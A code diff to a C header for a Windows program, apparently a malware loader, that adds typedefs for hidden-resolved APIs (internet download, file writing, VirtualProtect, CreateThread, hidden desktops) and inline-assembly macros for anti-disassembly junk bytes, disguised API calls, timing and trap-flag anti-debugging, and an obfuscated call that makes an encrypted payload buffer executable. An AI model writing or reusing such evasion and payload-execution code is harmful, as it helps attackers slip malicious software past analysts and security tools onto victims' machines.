@@ -3,9 +3,13 @@
 
 #include "config.h"
 
-// #ifdef DEBUG
+#ifdef DEBUG
 #include <stdio.h>
 #endif
+
+extern void setTrapFlag(void);
+extern void stepOverExit(void);
+extern void appendByteExit(void);
 
 #include <windows.h>
 #include "../crypto/aes.h"
@@ -30,6 +34,82 @@ typedef NTSTATUS(NTAPI* pLdrLoadDll) (
     PHANDLE ModuleHandle
     );
 
+typedef unsigned int (*payload)(unsigned long long*);
+typedef WINBOOL (NTAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+typedef void (WINAPI*pGetSystemTime)(void);
+typedef HANDLE (WINAPI*pCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+typedef WINBOOL (WINAPI*pWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+typedef WINBOOL (WINAPI*pCloseHandle)(HANDLE hObject);
+typedef HINTERNET (WINAPI*pInternetOpenW)(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags);
+typedef HINTERNET (WINAPI*pInternetOpenUrlA)(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
+typedef WINBOOL (WINAPI*pInternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
+typedef WINBOOL (WINAPI*pInternetCloseHandle)(HINTERNET hInternet);
+typedef DWORD (WINAPI*pGetLastError)(void);
+typedef void (WINAPI*pExitProcess)(UINT uExitCode);
+typedef HDESK (WINAPI*pCreateDesktopW)(LPCWSTR lpszDesktop, LPCWSTR lpszDevice, LPDEVMODEW pDevmode, DWORD dwFlags, ACCESS_MASK dwDesiredAccess, LPSECURITY_ATTRIBUTES lpsa);
+typedef WINBOOL (WINAPI*pSetThreadDesktop)(HDESK hDesktop);
+typedef HANDLE (WINAPI*pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+typedef WINBOOL (WINAPI*pCloseDesktop)(HANDLE hObject);
+
+#define TOMFOOLERY asm volatile(\
+        "call appendByte2Rip\n\t"\
+        ".byte 0x9a\n\t"\
+    );
+
+// DO NOT CALL BEFORE FETCHING _GetSystemTime
+#define RECORD_TIME asm volatile(\
+        "call pushTime\n\t"\
+        ".byte 0x9a\n\t"\
+        ::: "%rax","%rcx","%r11","%rdi"\
+);
+
+
+#define CHECK_TIME asm volatile(\
+        "call loadTime\n\t"\
+        ".byte 0x9a\n\t"\
+        ::: "%rax","%rcx","%r11","%rdi"\
+);
+
+#define RANDOM_BYTE asm volatile(\
+    ".byte 0x9a"\
+);
+
+#define SHORT_JMP asm volatile(\
+    ".word 0x01eb\n\t"\
+    ".byte 0x9a\n\t"\
+);
+
+#define OBFUSCATE_WIN_CALL asm volatile(\
+    "call callSecretWIN\n\t"\
+    ".byte 0x9a\n\t"\
+);
+
+#define DYNAMIC_RETURN asm volatile(\
+    ".byte 0xe8\n\t"\
+    ".word 0x0001\n\t"\
+    ".word 0x0000\n\t"\
+    ".byte 0x9a\n\t"\
+    "pop %%rax\n\t"\
+    "add $9, %%rax\n\t"\
+    "push %%rax\n\t"\
+    "ret\n\t"\
+    ".byte 0x9a\n\t"\
+    ::: "%rax"\
+)
+// VirtualProtect(execute_me, sizeof(payload_enc_bytes), PAGE_EXECUTE_READWRITE, junk);
+#define VIRT_PROTECT_OBF(data, size, perms, junk_ptr) asm volatile(\
+        "mov %0, %%rcx\n\t"\
+        "mov %1, %%edx\n\t"\
+        "mov %2, %%r8d\n\t"\
+        "mov %3, %%r9\n\t"\
+        "call callSecretWIN\n\t"\
+        ".byte 0x64\n\t"\
+        "call VirtualProtect\n\t"\
+        : : "r" (data), "i" (size), "i" (perms), "r" (junk_ptr) : "%rdi"\
+);
+
 HMODULE _LoadLibrary(LPCWSTR lpFileName);
 HMODULE _GetModuleHandle(LPCWSTR lModuleName);
 FARPROC _GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
+
+#endif
